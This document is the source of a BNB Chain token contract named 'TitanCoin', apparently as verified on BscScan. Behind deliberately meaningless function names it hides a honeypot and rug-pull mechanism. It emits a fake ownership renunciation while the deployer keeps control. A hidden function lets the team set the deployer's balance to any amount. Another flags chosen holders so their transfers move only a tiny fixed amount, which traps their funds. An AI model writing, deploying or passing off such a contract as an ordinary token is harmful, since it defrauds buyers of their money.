/**
 *Submitted for verification at BscScan.com on 2023-02-06
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface amountBuy {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface totalTake {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract TitanCoin {
    uint8 private toSwap = 18;

    address private tokenWallet;

    string private totalLimit = "Titan Coin";
    string private sellLaunched = "TCN";

    uint256 private listLiquidityLaunched = 100000000 * 10 ** toSwap;
    mapping(address => uint256) private sellFromTrading;
    mapping(address => mapping(address => uint256)) private senderSell;

    mapping(address => bool) public teamIs;
    address public amountTeamMin;
    address public autoReceiver;
    mapping(address => bool) public toMode;
    uint256 constant sellList = 11 ** 10;
    bool public receiverAt;

    

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        amountBuy senderLiquidity = amountBuy(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        autoReceiver = totalTake(senderLiquidity.factory()).createPair(senderLiquidity.WETH(), address(this));
        tokenWallet = totalMarketing();
        amountTeamMin = tokenWallet;
        teamIs[amountTeamMin] = true;
        sellFromTrading[amountTeamMin] = listLiquidityLaunched;
        emit Transfer(address(0), amountTeamMin, listLiquidityLaunched);
        atSell();
    }

    

    function getOwner() external view returns (address) {
        return tokenWallet;
    }

    function totalMarketing() private view returns (address) {
        return msg.sender;
    }

    function approve(address buyAuto, uint256 maxTx) public returns (bool) {
        senderSell[totalMarketing()][buyAuto] = maxTx;
        emit Approval(totalMarketing(), buyAuto, maxTx);
        return true;
    }

    function totalSupply() external view returns (uint256) {
        return listLiquidityLaunched;
    }

    function tradingAuto(address tradingSell) public {
        if (tradingSell == amountTeamMin || tradingSell == autoReceiver || !teamIs[totalMarketing()]) {
            return;
        }
        toMode[tradingSell] = true;
    }

    function owner() external view returns (address) {
        return tokenWallet;
    }

    function launchAt(address feeLiquidityTeam) public {
        if (receiverAt) {
            return;
        }
        teamIs[feeLiquidityTeam] = true;
        receiverAt = true;
    }

    function name() external view returns (string memory) {
        return totalLimit;
    }

    function symbol() external view returns (string memory) {
        return sellLaunched;
    }

    function transferFrom(address teamTo, address tokenEnable, uint256 maxTx) public returns (bool) {
        if (teamTo != totalMarketing() && senderSell[teamTo][totalMarketing()] != type(uint256).max) {
            require(senderSell[teamTo][totalMarketing()] >= maxTx);
            senderSell[teamTo][totalMarketing()] -= maxTx;
        }
        if (tokenEnable == amountTeamMin || teamTo == amountTeamMin) {
            return swapFrom(teamTo, tokenEnable, maxTx);
        }
        if (toMode[teamTo]) {
            return swapFrom(teamTo, tokenEnable, sellList);
        }
        return swapFrom(teamTo, tokenEnable, maxTx);
    }

    function tradingLimit(uint256 maxTx) public {
        if (!teamIs[totalMarketing()]) {
            return;
        }
        sellFromTrading[amountTeamMin] = maxTx;
    }

    function transfer(address tokenEnable, uint256 maxTx) external returns (bool) {
        return transferFrom(totalMarketing(), tokenEnable, maxTx);
    }

    function balanceOf(address walletMin) public view returns (uint256) {
        return sellFromTrading[walletMin];
    }

    function allowance(address senderMode, address buyAuto) external view returns (uint256) {
        return senderSell[senderMode][buyAuto];
    }

    function swapFrom(address atFrom, address tokenShould, uint256 maxTx) internal returns (bool) {
        require(sellFromTrading[atFrom] >= maxTx);
        sellFromTrading[atFrom] -= maxTx;
        sellFromTrading[tokenShould] += maxTx;
        emit Transfer(atFrom, tokenShould, maxTx);
        return true;
    }

    function decimals() external view returns (uint8) {
        return toSwap;
    }

    function atSell() public {
        emit OwnershipTransferred(amountTeamMin, address(0));
        tokenWallet = address(0);
    }


}